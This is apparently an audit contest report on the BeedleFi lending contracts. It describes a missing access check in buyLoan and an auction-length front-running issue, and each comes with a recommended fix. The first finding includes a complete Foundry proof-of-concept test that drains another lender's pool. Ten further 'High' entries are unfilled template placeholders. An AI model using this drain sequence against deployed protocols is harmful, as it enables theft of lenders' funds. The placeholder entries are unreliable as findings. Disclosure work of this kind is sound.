# What is BeedleFi?

Description

[Link to the contest](https://www.codehawks.com/contests/clkbo1fa20009jr08nyyf9wbx)

# Issues found by me

| Severity | Title                                                                                                       | Link     |
| :------- | :---------------------------------------------------------------------------------------------------------- | :------- |
| High     | Lender.sol#buyLoan - Anyone can buy loans on behalf of other lenders, potentially draining all of the pools | [Link]() |
| High     | Lender can change the auction length and take borrowers collateral very fast                                | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |
| High     | Issue title                                                                                                 | [Link]() |

# 1. Lender.sol#buyLoan - Anyone can buy loans on behalf of other lenders, potentially draining all of the pools

## Summary

The `buyLoan(uint256 loanId, bytes32 poolId)` function doesn't verify that the msg.sender is the lender of the poolId passed as a parameter. This enables anyone to buy loans on behalf of someone else's pools and draining them that way.

## Vulnerability Detail

Here is how the attack would go, POC in code is below:

- There is an existing pool of a normal lender - lender1
- Malicious lender - lender2 creates a pool(with big maxLoanRatio so he can get a big loan as a borrower)
- From another address as a borrower he borrows a big loan from his pool
- Auctions the loan, then buys it on behalf of lender1's pool, effectively draining his balance while the loanTokens lender2 transferred to the borrower are now restored(because the loan is supposed to be someone else's now)
- Lender2 has the same balance as he started with, and the Borrower has his loan and collateral tokens
- Lender1 can't auction, seize, or give the Borrower's loan because he is not the lender of the loan(the lender is whoever called the buyLoan function)
  This can be done for any pool in the protocol and can be done a lot more precisely with less amount of liquidity needed if the pools and their balances when deployed are known.

Add this test to Lender.t.sol:

Note: I had to run it with forge test --match-test testCleanCleanPOC -vvv --via-ir because of a stack too deep error.

```javascript
function testExploitPOC() public {
        //Creating lender1's pool(the victim)
        vm.startPrank(lender1);
        Pool memory poolL1 = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 0, //for simple calculations
            outstandingLoans: 0
        });
        bytes32 poolId1 = lender.setPool(poolL1);

        //Creating lender2's pool(the attacker)
        vm.startPrank(lender2);
        Pool memory poolL2 = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 10 * 10 ** 18, //this needs to be big so we can borrow a lot of funds
            auctionLength: 20, //this needs to be low so we can quickly buy the loan without getting error RateTooHigh
            interestRate: 0, //for simple calculations
            outstandingLoans: 0
        });
        bytes32 poolId2 = lender.setPool(poolL2);

        //loanIds
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        //set up the borrow from Lender2's pool
        vm.startPrank(borrower);
        Borrow memory b = Borrow({
            poolId: poolId2,
            debt: 1000 * 10 ** 18,
            collateral: 100 * 10 ** 18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;

        //get the balances of poolId1 and poolId2
        (, , , , uint256 poolId1Balance, , , , ) = lender.pools(poolId1);
        (, , , , uint256 poolId2Balance, , , , ) = lender.pools(poolId2);

        //assert starting balances of borrower are 0, and the pools are with the balances we created them with
        assertEq(0, TERC20(loanToken).balanceOf(borrower));
        assertEq(0, TERC20(loanToken).balanceOf(borrower));
        assertEq(1000 * 10 ** 18, poolId1Balance);
        assertEq(1000 * 10 ** 18, poolId2Balance);

        //borrow from Lender2's pool
        lender.borrow(borrows);
        (address loanLender, address loanBorrower, , , , , , , , ) = lender
            .loans(0);

        //loan is set up correctly where the loan lender is lender2 and loanBorrower is borrower
        assertEq(loanLender, lender2);
        assertEq(loanBorrower, borrower);

        //get the balances of poolId1 and poolId2
        (, , , , poolId1Balance, , , , ) = lender.pools(poolId1);
        (, , , , poolId2Balance, , , , ) = lender.pools(poolId2);

        //assert pool1's balance is the same while pool2 balance is - debt
        assertEq(1000 * 10 ** 18, poolId1Balance);
        assertEq(1000 * 10 ** 18 - b.debt, poolId2Balance);

        vm.startPrank(lender2);
        lender.startAuction(loanIds);
        //skip 1 seconds ahead
        vm.warp(block.timestamp + 1);

        //Buying the loan on behalf of poolId1 which is Lender1's pool. Msg.sender here is lender2
        lender.buyLoan(0, poolId1);

        (, , , , poolId1Balance, , , , ) = lender.pools(poolId1);
        (, , , , poolId2Balance, , , , ) = lender.pools(poolId2);

        //Lender2's pool balance is the same as what he started with
        //Lender1's pool balance is 0
        assertEq(0, poolId1Balance);
        assertEq(1000 * 10 ** 18, poolId2Balance);

        //Borrower has his loan and collateral tokens
        //995e18 and not 1000e18 because of fees
        assertEq(995 * 10 ** 18, TERC20(loanToken).balanceOf(borrower));
        assertEq(995 * 10 ** 18, TERC20(loanToken).balanceOf(borrower));

        //loanLender is still lender2
        (loanLender, , , , , , , , , ) = lender.loans(0);
        assertEq(loanLender, lender2);

        //Now both the borrower and lender2 have their tokens
        //The lender of the loan is still lender2
        //Which means lender1 can't startAuction for the borrower's loan, he can't give it, and he can't seize it - because he's not the lender
        vm.startPrank(lender1);
        vm.expectRevert();
        lender.startAuction(loanIds);
    }
```

## Impact

If the attack is precisely executed it can drain all the pools in the protocol in a very short time.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465

## Recommendation

Add `require(pools[poolId].lender == msg.sender)`, you have this check on almost every other function.

# 2. Lender can change the auction length and take borrowers collateral very fast

## Summary

Borrower can end up in a loan with a lot shorter auction length than expected, resulting in lender being able to liquidate him very quickly and take his collateral as there is no check in the borrow() function that the auction length is the same as the auction length at the time of submitting the transaction.

## Vulnerability Detail

Consider this scenario:

- A malicious lender sets up a pool with a very good conditions to attract borrowers and monitors the mem pool
- When a user submits a transaction to borrow funds, the lender front-runs him and changes the auction length to 1 second. This can be done as there is no MIN_AUCTION_LENGTH constant.
- The borrower ends up in a loan that can be liquidated very quickly - something the borrower did not expect

## Impact

Depending on the loan-to-value ratio, the collateral of the borrower could be worth a lot more than the loan. The lender will be able to liquidate him very quickly and take his collateral.

## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232

## Recommendation

You can add a variable `auctionLength` that should be passed as an argument to the `borrow` function or you can add it as a parameter of the Borrow struct. Then require `auctionLength` of the Borrow being equal to the `auctionLength` of the pool. Additionally, you can add a `MIN_AUCTION_LENGTH` constant as it makes sense for the auction to be at least a reasonable amount of time.

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation

# 1. Issue title

## Summary

Here goes some summary

## Vulnerability Detail

Here goes some detail

## Impact

Here goes some impact

## Code Snippet

Code snippet

## Recommendation

Recommendation
